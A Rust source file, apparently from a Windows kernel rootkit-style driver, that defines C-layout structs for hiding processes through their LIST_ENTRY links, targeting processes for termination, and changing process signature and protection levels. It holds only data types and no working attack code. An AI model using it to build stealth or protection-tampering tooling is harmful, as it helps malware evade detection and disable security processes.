use super::LIST_ENTRY;
use core::sync::atomic::AtomicPtr;

/// Stores information about a process that has been hidden from the system.
///
/// This struct holds the process identifier (PID) and a pointer to the process's
/// `LIST_ENTRY`, which is part of the system's internal list management structure.
/// The `AtomicPtr` ensures safe concurrent access to the `LIST_ENTRY`.
#[repr(C)]
#[derive(Debug)]
pub struct HiddenProcessInfo {
    /// The process identifier (PID) of the hidden process.
    pub pid: usize,
    
    /// A pointer to the `LIST_ENTRY` structure, which is used to represent the process
    /// in the system's linked list of processes. This is wrapped in an `AtomicPtr` for safe concurrent access.
    pub list_entry: AtomicPtr<LIST_ENTRY>,
}

/// Represents basic information about a process.
///
/// This struct is used to store the PID of a process.
#[repr(C)]
#[derive(Debug)]
pub struct ProcessListInfo {
    /// The process identifier (PID) of the process.
    pub pids: usize,
}

/// Stores information about a target process for operations such as termination or manipulation.
///
/// This struct contains the process identifier (PID) of the target process. It is commonly used 
/// when the PID is the only information required for an operation on a process.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetProcess {
    /// The process identifier (PID) of the target process.
    pub pid: usize,
}

/// Represents the state of a process with respect to hiding or visibility.
///
/// This struct stores the PID of a process and a boolean flag that indicates whether the process 
/// is hidden (`true`) or visible (`false`).
#[repr(C)]
#[derive(Debug, Default)]
pub struct ProcessInfoHide {
    /// The process identifier (PID) of the process.
    pub pid: usize,
    
    /// A boolean value indicating whether the process is hidden (`true`) or visible (`false`).
    pub enable: bool,
}

/// Stores signature information for a target process.
///
/// This struct holds information about the signature of a process, such as its PID, signer (sg),
/// and type (tp), which might represent the level or type of protection applied to the process.
#[repr(C)]
#[derive(Debug)]
pub struct ProcessSignature {
    /// The process identifier (PID) of the target process.
    pub pid: usize,

    /// The signer of the process, typically indicating the authority or certificate that signed it.
    pub sg: usize,

    /// The type of protection applied to the process, represented as an integer.
    pub tp: usize,
}

/// Stores information about whether a process is protected.
///
/// This struct holds the process identifier (PID) and a flag indicating whether the process is
/// protected. It is used to manage processes that have protection mechanisms enabled or disabled.
#[repr(C)]
#[derive(Debug)]
pub struct ProcessProtection {
    /// The process identifier (PID) of the process to be protected.
    pub pid: usize,

    /// A boolean flag indicating whether the process is protected (`true`) or unprotected (`false`).
    pub enable: bool,
}
